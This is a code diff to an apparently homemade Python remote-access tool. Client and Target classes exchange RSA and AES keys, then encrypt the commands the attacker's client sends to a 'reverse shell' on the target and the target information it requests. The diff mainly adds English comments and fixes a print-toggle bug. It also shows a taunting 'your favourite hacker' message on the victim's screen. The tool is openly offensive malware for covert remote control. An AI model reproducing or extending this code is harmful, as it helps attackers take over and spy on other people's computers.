@@ -20,21 +20,23 @@ class Machine:
         except socket.error as msg:
             print("Socket creation error: " + str(msg))
 
+    # Receive encrypted message in AES
     def recv_message_encryption_aes(self, connection):
         mode_aes = AES.MODE_CFB
         text_enc = connection.recv(self.buffer)
-        cipher_aes = AES.new(self.key_aes, mode_aes, iv=self.iv_aes)  # Pareil que RSA
+        cipher_aes = AES.new(self.key_aes, mode_aes, iv=self.iv_aes)  # Execute the cipher algorithm
         text = cipher_aes.decrypt(text_enc)
         try:
             return text.decode("utf-8")
         except UnicodeDecodeError:
             return text
 
+    # Send message in AES
     def send_message_encryption_aes(self, connection, text_to_encrypt):
         if type(text_to_encrypt) == str:
             text_to_encrypt = text_to_encrypt.encode("utf-8")
         mode_aes = AES.MODE_CFB
-        cipher_aes = AES.new(self.key_aes, mode_aes, iv=self.iv_aes)  # Pareil que RSA
+        cipher_aes = AES.new(self.key_aes, mode_aes, iv=self.iv_aes)  # Execute the cipher algorithm
         text_enc = cipher_aes.encrypt(text_to_encrypt)
         connection.send(text_enc)
 
@@ -62,20 +64,23 @@ class Client(Machine):
             print("the ip address is invalid")
             print("Error " + str(msg))
 
+    # Generate a RSA key and send it to the server
     def key_generate_rsa(self):
         self.key_rsa = RSA.generate(self.buffer)
         key_pub = self.key_rsa.publickey()
         key_pub_b = key_pub.export_key()
         self.s.send(key_pub_b)
 
+    # Receive the AES key that the server generate
     def recv_key_aes(self):
         key_aes_enc = self.s.recv(self.buffer)
         iv_aes_enc = self.s.recv(self.buffer)
-        cipher_rsa = PKCS1_OAEP.new(self.key_rsa)  # Pareil que chiffrement
+        cipher_rsa = PKCS1_OAEP.new(self.key_rsa)  # Prepare the cipher algorithm
         self.key_aes = cipher_rsa.decrypt(key_aes_enc)
         cipher_rsa = PKCS1_OAEP.new(self.key_rsa)
         self.iv_aes = cipher_rsa.decrypt(iv_aes_enc)
 
+    # Send commands to the reverse shell
     def reverse_shell_send_command(self):
         try:
             super().send_message_encryption_aes(self.s, "shell")
@@ -99,6 +104,7 @@ class Client(Machine):
         except OSError:
             print("The connection should be already closed")
 
+    # Send & receive information about the target
     def getinfo(self, info):
         try:
             super().send_message_encryption_aes(self.s, info)
@@ -115,7 +121,7 @@ class Client(Machine):
         if print_bool:
             super().send_message_encryption_aes(self.s, "print_target_True")
         else:
-            super().send_message_encryption_aes(self.s, "print_target_True")
+            super().send_message_encryption_aes(self.s, "print_target_False")
 
     # change the buffer size for the client and the target
     def set_target_buffer(self, size):
@@ -170,12 +176,14 @@ class Target(Machine):
             print("Connexion has been establish | " + "IP " + self.information[0] + " | Port : " +
                   str(self.information[1]))
 
+    # Receive the RSA key that client generate
     def recv_key_rsa(self):
         key_pub_from_us = self.conn.recv(self.buffer)
         self.key_pub_usable = RSA.import_key(key_pub_from_us)
         if self.print:
             print("RSA key received")
 
+    # generate an AES key and send it to client
     def send_key_aes(self):
         self.key_aes = get_random_bytes(16)
         self.iv_aes = get_random_bytes(16)
@@ -193,8 +201,9 @@ class Target(Machine):
             while instruction != "quit":
                 instruction = super().recv_message_encryption_aes(self.conn)
                 if instruction == "print_target_True":
+                    if not self.print:
+                        print("Hi, your favourite hacker decide to show you what he is doing :) What a great man")
                     self.print = True
-                    print("Hi, your favourite hacker decide to show you what he is doing :) What a great man")
                 elif instruction == "print_target_False":
                     self.print = False
                 elif instruction == "shell":
